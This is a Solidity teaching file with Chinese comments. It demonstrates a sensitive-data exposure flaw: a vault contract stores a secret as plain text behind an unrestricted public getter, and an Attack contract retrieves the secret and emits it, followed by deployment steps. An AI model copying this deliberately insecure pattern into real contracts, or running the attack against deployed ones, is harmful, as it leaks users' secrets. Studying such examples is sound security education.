// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

// 此合約示範 Improper Protection of Sensitive Data 漏洞，
// 敏感資料 secretData 被以明文形式儲存，且透過 public 函式 getSecret() 任意取得，
// 無論誰呼叫皆可存取，造成敏感資料洩漏風險。

contract SensitiveVault {
    // 漏洞重點：敏感資料以明文儲存且未妥善保護
    string private secretData;  // 敏感資料

    // 部署合約時即設定一組敏感資料
    constructor(string memory _secret) {
        secretData = _secret;
    }

    // 漏洞重點：未進行存取控制，對外暴露敏感資料
    function getSecret() public view returns (string memory) {
        return secretData; // 攻擊者可直接呼叫該方法竊取敏感資料
    }
}

// 以下為攻擊合約範例，用於示範如何竊取 SensitiveVault 中的敏感資料。
contract Attack {
    SensitiveVault public vulnerableContract;
    event LeakedSecret(string secret);

    // 在部署 Attack 合約時，傳入目標 Vulnerable Contract 的地址
    constructor(address _vulnerableAddress) {
        vulnerableContract = SensitiveVault(_vulnerableAddress);
    }

    // 攻擊方法：直接呼叫 getSecret() 取得敏感資料
    function attack() public {
        // 攻擊者利用未受保護的 public 方法獲取敏感資料
        string memory leaked = vulnerableContract.getSecret();
        // 透過事件輸出竊取得到的敏感資料，證明攻擊成功
        emit LeakedSecret(leaked);
    }
}

/*
部署與攻擊步驟：
1. 部署 SensitiveVault 合約，並輸入一個敏感資料，例如 "MySecretPassword"。
2. 部署 Attack 合約，並將 SensitiveVault 部署後的合約地址作為參數傳入。
3. 呼叫 Attack 合約的 attack() 方法，便會透過 getSecret() 方法取得敏感資料。
*/